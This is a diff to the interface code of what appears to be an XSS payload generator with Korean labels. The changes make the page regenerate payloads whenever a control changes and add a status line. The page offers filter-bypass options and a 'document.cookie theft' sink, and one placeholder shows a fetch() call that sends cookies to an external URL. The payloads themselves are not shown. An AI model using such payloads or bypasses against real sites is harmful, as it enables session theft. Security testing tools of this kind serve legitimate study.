@@ -61,7 +61,7 @@
 
         <div class="form-group">
           <label>Injection Context</label>
-          <select id="ctx">
+          <select id="ctx" onchange="safeGenerateXSSPayloads()">
             <option value="html_body">HTML Body (태그 사이)</option>
             <option value="html_attr_dq">HTML Attribute (쌍따옴표)</option>
             <option value="html_attr_sq">HTML Attribute (홑따옴표)</option>
@@ -77,7 +77,7 @@
 
         <div class="form-group">
           <label>Sink / 목적</label>
-          <select id="sink">
+          <select id="sink" onchange="safeGenerateXSSPayloads()">
             <option value="alert">alert(1) — 기본 PoC</option>
             <option value="cookie">document.cookie 탈취</option>
             <option value="custom">커스텀 페이로드</option>
@@ -86,23 +86,23 @@
 
         <div class="form-group" id="customGroup" style="display:none">
           <label>커스텀 JS 페이로드</label>
-          <input type="text" id="customPayload" placeholder="fetch('https://...?c='+document.cookie)">
+          <input type="text" id="customPayload" placeholder="fetch('https://...?c='+document.cookie)" oninput="safeGenerateXSSPayloads()">
         </div>
 
         <div class="form-group">
           <label>필터 우회 옵션</label>
           <div class="check-group">
-            <label class="check-item"><input type="checkbox" id="f_case"> 대소문자 변환 우회</label>
-            <label class="check-item"><input type="checkbox" id="f_encode"> HTML/URL 엔티티 인코딩</label>
-            <label class="check-item"><input type="checkbox" id="f_script"> &lt;script&gt; 태그 차단 우회</label>
-            <label class="check-item"><input type="checkbox" id="f_space"> 공백 필터 우회</label>
-            <label class="check-item"><input type="checkbox" id="f_evt"> on이벤트 속성 필터 우회</label>
-            <label class="check-item"><input type="checkbox" id="f_proto"> javascript: 프로토콜 필터 우회</label>
-            <label class="check-item"><input type="checkbox" id="f_angular"> AngularJS sandbox</label>
+            <label class="check-item"><input type="checkbox" id="f_case" onchange="safeGenerateXSSPayloads()"> 대소문자 변환 우회</label>
+            <label class="check-item"><input type="checkbox" id="f_encode" onchange="safeGenerateXSSPayloads()"> HTML/URL 엔티티 인코딩</label>
+            <label class="check-item"><input type="checkbox" id="f_script" onchange="safeGenerateXSSPayloads()"> &lt;script&gt; 태그 차단 우회</label>
+            <label class="check-item"><input type="checkbox" id="f_space" onchange="safeGenerateXSSPayloads()"> 공백 필터 우회</label>
+            <label class="check-item"><input type="checkbox" id="f_evt" onchange="safeGenerateXSSPayloads()"> on이벤트 속성 필터 우회</label>
+            <label class="check-item"><input type="checkbox" id="f_proto" onchange="safeGenerateXSSPayloads()"> javascript: 프로토콜 필터 우회</label>
+            <label class="check-item"><input type="checkbox" id="f_angular" onchange="safeGenerateXSSPayloads()"> AngularJS sandbox</label>
           </div>
         </div>
 
-        <button class="btn-gen" id="generateBtn" type="button">페이로드 생성</button>
+        <button class="btn-gen" id="generateBtn" type="button" onclick="safeGenerateXSSPayloads()">페이로드 생성</button>
       </div>
 
       <!-- 결과 -->
@@ -111,6 +111,7 @@
           생성된 페이로드
           <span class="count-badge" id="countBadge">5</span>
         </h2>
+        <div class="payload-note" id="xssStatus" style="margin-bottom:.75rem">기본 HTML Body / alert(1) 페이로드</div>
         <div class="payload-list" id="payloadList">
           <div class="payload-card">
             <div class="payload-top">
@@ -310,6 +311,7 @@
       // 렌더링
       const list = document.getElementById('payloadList');
       document.getElementById('countBadge').textContent = payloads.length;
+      updateStatus(ctx, document.getElementById('sink').value, payloads.length);
 
       if (payloads.length === 0) {
         list.replaceChildren(makeEmptyState('해당 설정으로 생성된 페이로드가 없습니다.'));
@@ -373,6 +375,16 @@
       return div;
     }
 
+    function updateStatus(ctx, sink, count) {
+      const status = document.getElementById('xssStatus');
+      if (!status) return;
+      const checked = ['f_case','f_encode','f_script','f_space','f_evt','f_proto','f_angular']
+        .filter(id => document.getElementById(id)?.checked)
+        .map(id => document.querySelector(`label.check-item input#${id}`)?.parentElement?.textContent.trim())
+        .filter(Boolean);
+      status.textContent = `Context: ${ctx} / Sink: ${sink} / 필터: ${checked.length ? checked.join(', ') : '없음'} / ${count}개 생성`;
+    }
+
     function escHtml(s) {
       return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
     }
@@ -394,12 +406,17 @@
       const sink = document.getElementById('sink');
       const btn = document.getElementById('generateBtn');
       const list = document.getElementById('payloadList');
+      const controls = document.querySelectorAll('#ctx, #sink, #customPayload, #f_case, #f_encode, #f_script, #f_space, #f_evt, #f_proto, #f_angular');
       if (sink) {
         sink.addEventListener('change', function() {
           document.getElementById('customGroup').style.display = this.value === 'custom' ? 'block' : 'none';
         });
       }
       if (btn) btn.addEventListener('click', safeGenerateXSSPayloads);
+      controls.forEach(control => {
+        control.addEventListener('change', safeGenerateXSSPayloads);
+        control.addEventListener('input', safeGenerateXSSPayloads);
+      });
       if (list) {
         list.addEventListener('click', event => {
           const copy = event.target.closest('[data-copy]');
